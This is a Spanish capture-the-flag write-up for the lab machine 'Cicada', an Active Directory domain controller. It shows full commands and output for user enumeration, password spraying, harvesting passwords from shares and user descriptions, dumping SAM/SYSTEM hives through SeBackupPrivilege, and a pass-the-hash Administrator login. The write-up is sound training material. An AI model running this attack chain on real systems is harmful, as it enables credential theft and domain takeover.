# Cicada
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Cicada.png" alt="Cicada" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>Active Directory Enumeration and Privilege Escalation</li>
        <li>Password Spraying</li>
        <li>SeBackup Privilege Abuse</li>
        <li>Pass-the-Hash Attack</li>
      </ul>
    </td>
  </tr>
</table>
## Reconocimiento inicial 

Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 

```shell
nmap -p- --min-rate=5000 -sS 10.10.11.35 -vvv -oN allport
```

```shell
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
63652/tcp open  unknown          syn-ack ttl 127
```

```shell
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,63652 10.10.11.35
```
```shell
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-14 00:03:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-14T00:05:18+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-14T00:05:18+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-14T00:05:18+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-14T00:05:18+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
63652/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-time: 
|   date: 2025-10-14T00:04:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Como se puede apreciar nos encontramos ante una máquina bastante interesante que posiblemente sea de Directorio Activo por los puerto LDAP , kerberos, SMB...

Se puede apreciar que es un `Windows server de 2002` con servicios AD expuestos.

## Enumeracion de servicios SMB

Primero chequeamos SMB usando la herramienta `netexec `

```shell
netexec smb 10.10.11.35
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
```
Usando la herramienta `kerbrute`podemos intentar enumerar algunos usuarios 

```shell
kerbrute userenum --dc 10.10.11.35 -d cicada.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
```shell
2025/10/13 13:39:35 >  [+] VALID USERNAME:       guest@cicada.htb
2025/10/13 13:39:42 >  [+] VALID USERNAME:       administrator@cicada.htb
2025/10/13 13:40:45 >  [+] VALID USERNAME:       Guest@cicada.htb
2025/10/13 13:40:46 >  [+] VALID USERNAME:       Administrator@cicada.htb
2025/10/13 13:44:38 >  [+] VALID USERNAME:       GUEST@cicada.htb
```

Nos encontramos que de esta manera encontramos dos usuarioos un `guest` y otro Administrator

```
netexec smb 10.10.11.35 --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

Enumerando con smbclient podemos ver que recursos compartidos podemos acceder como usuario por defecto.

```shell
smbclient -L 10.10.11.35 -N         

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```
Compruebo si los recursos con el usuaario `guest` son diferentes y puedo listar otros recursos según los permisos.

```shell
netexec smb 10.10.11.35 -u 'guest' -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
```
Voy a listar que nos encontramos en el directorio HR en el que tengo permiso de lectura.

```shell
smbmap -H 10.10.11.35 -u 'guest' -p '' -r HR
IP: 10.10.11.35:445 Name: cicada.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS
        HR                                                      READ ONLY
        ./HR
        dr--r--r--                0 Fri Mar 15 02:26:17 2024    .
        dr--r--r--                0 Thu Mar 14 08:21:29 2024    ..
        fr--r--r--             1266 Wed Aug 28 13:31:48 2024    Notice from HR.txt
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share
```

Podemos ver que nos encontramos con fichero que podemos ver `Notice from HR.txt` podemos ver este tipo de fichero 
que nos encontramos.
```shell
smbclient //10.10.11.35/HR -N               
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

```
Nos traemos el fichero aa nuestro directorio local para ver si contiene ingormacion interesante.
```shell
cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

Podemos ver que hay una contraseña `Cicada$M6Corpb*@Lp#nZp!8` sin embargo ahora a priori no sabemos a que usuario pertenece.

Con el siguiente comando podemos descubrir más usuarios enumerando RIDs con ello podemos ver cuentas válidas

```shell
netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute

SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
```
```shell
netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep "SidTypeUser"

SMB                      10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB                      10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
Tras extraer posibles usuarios a un diccionario `users.txt` comprobamos que existen para no tener algún falso positivo


```shell
kerbrute userenum --dc 10.10.11.35 -d cicada.htb /home/kali/Desktop/EJPT/Cicada/users.txt

2025/10/13 14:03:52 >  [+] VALID USERNAME:       Administrator@cicada.htb
2025/10/13 14:03:52 >  [+] VALID USERNAME:       Guest@cicada.htb
2025/10/13 14:03:52 >  [+] VALID USERNAME:       john.smoulder@cicada.htb
2025/10/13 14:03:52 >  [+] VALID USERNAME:       CICADA-DC$@cicada.htb
2025/10/13 14:03:52 >  [+] VALID USERNAME:       emily.oscars@cicada.htb
2025/10/13 14:03:52 >  [+] VALID USERNAME:       michael.wrightson@cicada.htb
2025/10/13 14:03:52 >  [+] VALID USERNAME:       david.orelious@cicada.htb
2025/10/13 14:03:52 >  [+] VALID USERNAME:       sarah.dantelia@cicada.htb
```



```shell
impacket-GetNPUsers -no-pass -usersfile users.txt cicada.htb/ 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CICADA-DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User john.smoulder doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sarah.dantelia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User michael.wrightson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User david.orelious doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emily.oscars doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Vamos a probar los diferentes usuarios para esa contraseña anteriormente encontrada.

```shell
netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```
Como se puede apreciar tenemos una coincidencia del usuario `michael.wrightson` que es positiva por tanto vamos a enumerar los recursos compartidos que existen y los que podemos tener acceso.  Vemos que tenemos el mismo capacidad de listar los recursos sin novedades por lo tanto puede que tengamos que movernos a otro usuario.

```shell
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

Comprobamos si en las descripciones hay algo de material interesante que podamos obtener. Como se puede apreciar encontramos 
una contraseña del usuario david.orelious en su descripcion.

```shell
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users   

SMB 10.10.11.35  445 CICADA-DC david.orelious  2024-03-14 12:17:29 1  Just in case I forget my password is aRt$Lp#7t*VQ!3    
```

Por lo tanto vamos a comprobar si podemos listar y ver el contenido de algún directorio que anteriormente no tuvieramos acceso.

```shell
netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```
Efectivamente podemos leer ahora el contenido de el directorio `DEV`


```shell
smbclient //10.10.11.35/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3' 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

                4168447 blocks of size 4096. 447669 blocks available
smb: \> get "Backup_script.ps1"
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \> exit
```
Al igual que antes nos encontramos con un fichero `Backup_script.ps1` por lo tanto voy a proceder a descargarlo y ver el contenido. 

```shell
cat Backup_script.ps1   

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Nos encontramos un usuario nuevo y una contraseña por lo tanto vamos comprobar si podemos acceder con este usuario
y con la herramienta evil-winRM  obtenmos una shell.


## Intrusión en el sistema

```shell
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> ls



```
Como se puede apreciar obtenemos una shell y por lo tanto podemos ir al directorio y obtner la primera flags


## Escalada de privilegios

Para realizar la escalada de privilegios tenemos que ver que privilegios tenemos y de cuales podemos abusar para ello los listamos

```shell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

Encontramos algunos permisos un poco raros `SeBackupPrivilege y SeRestorePrivilege` que podemos investigar 

Encotramos esta explotación que podemos hacerla parecida, creando una copia de sam y de system para finalmente obtener los hashed del usuario
`administrator`.

https://medium.com/@pankajaditya/privilege-escalation-abusing-dangerous-privileges-sebackup-serestore-e360309da4a7


```shell
*Evil-WinRM* PS C:\Users> mkdir C:\Temp
*Evil-WinRM* PS C:\Temp> reg sabe hklm\sam C:\temp\sam.hive
*Evil-WinRM* PS C:\Temp> reg save hklm\system C:\temp\system.hive
*Evil-WinRM* PS C:\Temp> download sam.hive
*Evil-WinRM* PS C:\Temp> download system.hive
```

```shell
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Finalmente teniendo el hash del usuario administrator podemos obtener una shell con el
siguiente comando.

```shell
evil-winrm -i 10.10.11.35 -u 'Administrator' -H 2b87e7c93a3e8a0ea4a581937016f341
```
